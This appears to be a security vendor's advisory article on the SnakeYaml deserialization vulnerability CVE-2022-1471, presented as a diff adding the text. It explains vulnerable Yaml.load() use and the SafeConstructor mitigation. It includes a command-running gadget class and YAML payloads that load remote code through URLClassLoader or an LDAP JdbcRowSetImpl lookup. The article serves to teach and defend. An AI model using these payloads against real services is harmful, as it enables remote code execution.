@@ -1,0 +1,62 @@
+
+SnakeYaml is a well-known YAML 1.1 parser and emitter for Java. Recently, a vulnerability — CVE-2022-1471 — was reported for this package. This vulnerability can lead to arbitrary code execution. The org.yaml:snakeyaml package is widely used in the Java ecosystem, in part because it is packaged by default with Spring Boot in the spring-boot-starter. In this article, we look into the security vulnerability affecting this Java library, discuss the potential hazardous impact it may have on your applications, and weigh the actual risks.
+What is the SnakeYaml security vulnerability?
+The SnakeYaml library for Java is vulnerable to arbitrary code execution due to a flaw in its Constructor class. The class does not restrict which types can be deserialized, allowing an attacker to provide a malicious YAML file for deserialization and potentially exploit the system. Thus this flaw leads to an insecure deserialization issue that can result in arbitrary code execution.
+What the SnakeYaml vulnerability looks like
+Deserializing or marshaling YAML is quite easy with SnakeYaml. Typically you do something like this:
+1Yaml yaml = new Yaml();
+2File file = new File("file.yaml");
+3InputStream inputStream = new FileInputStream(file);
+4User user = yaml.load(inputStream);
+When loading the YAML from the file in the example above, the input gets parsed to the generic Object.class, which is the supertype of all Object in Java. In our code, we expect a User object, but the casting happens after the Object is loaded into memory. Because of the generic Object type, any object can be used. This can lead to arbitrary code execution if there is a gadget or gadget chain available in the classpath of the application.
+This is similar to what issues we've explored in the articles Serialization and deserialization in Java and Java JSON deserialization problems with the Jackson ObjectMapper.
+SnakeYaml vulnerability demo
+To demonstrate the vulnerable scenario, I deliberately created a gadget class. A gadget is a class that has a side effect when instantiated, either doing something directly or initiating a gadget chain. In this case, the gadget executes a given command when the constructor is called.
+1public class Gadget {
+2   private Runnable command;
+3
+4   public Gadget(String value) {
+5       this.command = new Command(value);
+6       this.command.run();
+7   }
+8}
+When this Java class is available, and I deserialize my YAML with the code given earlier, I can feed it the following content in the YAML file:
+1!!nl.brianvermeer.snakeyaml.Gadget ["touch myFile.txt"]
+This means I am allowed to specifically target any Java class with SnakeYaml that is available in the classpath. Because the class is already in my classpath, and SnakeYaml creates the object regardless of the intended class, I will end up with a ClassCastException. However, the harm is already done, and the command is executed. Having a gadget or gadget chain available in your classpath can lead to disastrous situations, like a reverse shell attack.
+How bad is the SnakeYaml vulnerability in real-world applications?
+It’s unlikely that anyone will create a gadget the way we did in the example above. However, bringing in third-party libraries does increase your chances of having gadgets that were created by other people in that manner present in your code. A quick look at the ysoserial GitHub repo, or the list of possible deserialization issues in the jackson-databind JSON marshaling library, shows that the risk potential is high. The difference with jackson-databind is that jackson does not by default enable defaultTyping (as we described in our prior vulnerability mention).
+Malicious actors can also use some of the classes within the JDK to do some damage. For example,  the ScriptEngine:
+1!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://localhost:8080/"]]]]
+This YAML input connects to a URL that can download harmful content into your application, as explained in this Websec article.
+Another example (depending on the Java version you are running) is the JdbcRowSetImpl class, which can leverage an LDAP request to do a lookup. This can enable similar risks as we have seen with Log4Shell not so long ago.
+1!!com.sun.rowset.JdbcRowSetImpl
+2dataSourceName: "ldap://localhost:9999/Evil"
+3autoCommit: true
+For more information, take a look at the SnakeYaml Bitbucket issue.
+Am I impacted by the SnakeYaml vulnerability?
+Whether you are impacted depends on how you use this library. If you are loading custom YAML data from other sources in a similar way to the use of XML and JSON objects, you might be vulnerable! The general rule is that you should not accept these inputs from unknown sources.
+In most cases, SnakeYaml will be used by other frameworks like Spring or Helidon to read YAML configurations that are already part of your system. If malicious actors are able to alter these configuration files, you have a different and probably larger problem. So I, personally, don’t think this has a huge impact.
+The maintainers of the library dispute the risk associated with this issue. Nevertheless, we simply can't predict how people are using a library like this.
+Proposed mitigation of SnakeYaml vulnerability
+As of publication, there is not a new version of this package available. The maintainers did accept a Git pull request that introduces a blocklist for specific artifacts to be deserialized. This is expected to be available in the 1.34 release. For now, it looks like there will be no generic fix for the default behavior.
+Note that the SnakeYaml documentation states: It is not safe to callYaml.load() with any data received from an untrusted source!The method Yaml.load() converts a YAML document to a Java object.
+Used by default, as shown below.
+1Yaml yaml = new Yaml(new SafeConstructor());
+Always scan your dependencies
+As you already know, most of the code in your applications comes from third-party libraries. And since no developer has the time to review all of the code in those libraries, it's important to scan your dependencies for known vulnerabilities. Snyk makes it easy with real-time scanning, actionable fix advice, and priority scoring so you can maximize the impact of your remediation efforts. Start your free account today.
+Get started in capture the flag
+Learn how to solve capture the flag challenges by watching our virtual 101 workshop on demand.
+
+org.yaml:snakeyaml
+spring-boot-starter
+Object.class
+Object
+User
+Object
+Object
+ClassCastException
+defaultTyping
+ScriptEngine
+JdbcRowSetImpl
+Yaml.load()
+Yaml.load()
